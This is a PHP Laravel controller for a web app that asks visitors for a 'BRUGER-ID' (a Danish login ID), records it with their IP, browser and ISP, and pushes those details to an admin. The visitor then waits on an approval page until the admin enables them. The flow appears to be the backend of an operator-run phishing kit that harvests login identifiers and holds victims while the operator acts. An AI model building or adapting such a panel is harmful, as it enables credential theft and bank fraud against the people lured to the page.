<?php

namespace App\Http\Controllers;

use App\Models\NewNotification;
use App\Models\User;
use App\Models\UserDetail;
use App\Models\VisitorDetail;
use Illuminate\Http\Request;
use Redirect;

class HomeController extends Controller
{
    public function index(Request $request){
        $ip = $request->ip();
        if($detail = UserDetail::where('ip', '=', $ip)->first()){
            $enable = $detail->enable;
            return view('frontend.approve',compact('enable'));
        }else
            return view('frontend.login');
    }

    public function login(Request $request){
        return view('frontend.login');
    }

    public function success(Request $request){
        $ip = $request->ip();
        if($detail = UserDetail::where('ip', '=', $ip)->first()){
            return view('frontend.home');
        }else
            return Redirect::route('user.login')->with('success','Please send a request');

    }

    public function store(Request $request){

        try {
            if ($request->browser == null) {
                return response()->json(['success' => false, 'message' => 'Browsers Details is required']);
            }
            if ($request->name == null) {
                return response()->json(['success' => false, 'message' => 'Please input BRUGER-ID']);
            }
            if ($request->dateTime == null) {
                return response()->json(['success' => false, 'message' => 'Date Time is required']);
            }

            $ip = $request->ip();
            $ips = $_SERVER['REMOTE_ADDR'];
            $ipinfo = '{"org": "AS16509 Amazon.com, Inc."}';//file_get_contents("https://ipinfo.io/" . $ips);
            $ipinfo_json = json_decode($ipinfo, true);

            if ($ipinfo_json['org'] == null) {
                $ispDetail = null;
            } else {
                $ispDetail = $ipinfo_json['org'];
            }

            $details = new UserDetail();
            $details->browser = $request->browser;
            $details->name = $request->name;
            $details->dateTime = $request->dateTime;
            $details->ip = $ip;
            $details->isp = $ispDetail;
            $details->enable = 1;
            $details->save();
            $detail = [
                'detail_id' => $details->id,
                'browser' => $request->browser,
                'name' => $request->name,
                'dateTime' => $request->dateTime,
                'ip' => $ip,
                'isp' => $ispDetail,
            ];

            if ($details) {
                $user = \DB::table('users as u')
                    ->leftjoin('role_users as ru','ru.user_id','=','u.id')
                    ->leftjoin('roles as r','r.id','=','ru.role_id')
                    ->where('r.slug','admin')->first();

                $notification = new NewNotification();
                $notification->user_id = $user->id;
                $notification->notification = json_encode($detail);
                $notification->status = 1;
                $notification->save();
                return Redirect::route('user.success')->with('success','Admin received your request');
            }
        } catch (\Exception $e) {
           \Log::info($e);
        }
        return Redirect::back()->with('error','Your request has some errors');
    }

    public function approve(Request $request){

        return view('frontend.approve');
    }

    /**
     * /api/visit
     * visit api
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function visit(Request $request){

        try {
            $ip = $request->ip();
            $visitor = new VisitorDetail();
            $visitor->browser = $request->browser;
            $visitor->dateTime = $request->datetime;
            $visitor->ip = $ip;
            $visitor->save();

            return response()->json(['success' => true, 'message' => 'Send a notification']);
        } catch (\Exception $e) {
            \Log::info($e);
            return response()->json(['success' => false, 'message' => 'Something went wrong with error']);
        }
    }

    public function check(Request $request){
        $ip = $request->ip();
        $detail = UserDetail::where('ip','=',$ip)->first();
        return response()->json([
            'approve' => $detail->enable]);
    }
}
